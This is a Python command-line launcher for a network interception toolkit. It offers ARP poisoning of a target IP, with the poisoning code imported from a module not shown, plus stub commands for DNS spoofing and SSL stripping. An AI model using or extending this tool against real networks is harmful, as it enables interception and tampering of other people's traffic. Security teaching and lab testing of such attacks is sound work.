import sys, argparse, time, psutil
import arp_poison as arp
#from scapy.all import sendp, ARP, Ether

def arp_poison():
    if (args.callback):
        arp.callback_arp_poison(args.iface, args.target_ip, args.spoof_ip)
    else:
        arp.grat_arp_poison(args.iface, args.target_ip, args.spoof_ip)
    return

def dns_spoof():
    args = parser_dns.parse_args()
    return

def ssl_strip():
    args = parser_ssl.parse_args()
    return

parser = argparse.ArgumentParser()
subparser = parser.add_subparsers(dest='attack')

parser_arp = subparser.add_parser('arp-poison', aliases=['arp'])
ifaces = [iface for iface in psutil.net_if_addrs().keys()]
parser_arp.add_argument('iface', choices=ifaces, help='')
parser_arp.add_argument('target_ip')
parser_arp.add_argument('spoof_ip')
parser_arp.add_argument('-c', '--callback', action='store_true')
parser_arp.set_defaults(func=arp_poison)

parser_dns = subparser.add_parser('dns-spoof', aliases=['dns'])
parser_dns.set_defaults(func=dns_spoof)

parser_ssl = subparser.add_parser('ssl-strip', aliases=['ssl'])
parser_ssl.set_defaults(func=ssl_strip)

args = parser.parse_args()
args.func()
